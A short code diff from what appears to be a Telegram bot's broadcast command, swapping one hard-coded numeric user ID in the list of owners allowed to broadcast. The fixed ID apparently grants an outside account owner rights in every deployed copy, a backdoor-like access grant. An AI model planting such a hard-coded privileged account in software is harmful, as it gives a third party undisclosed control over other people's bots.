@@ -151,7 +151,7 @@ async def broadcast_message(client, message, _):
 
     # get owner info
     C_OWNER = get_owner_id_from_db(bot_id)
-    OWNERS = [OWNER_ID, C_OWNER, 7355202884]
+    OWNERS = [OWNER_ID, C_OWNER, 8143754205]
 
     if message.from_user.id not in OWNERS:
         return await message.reply_text(_["c_brod_1"].format(SUPPORT_CHAT))
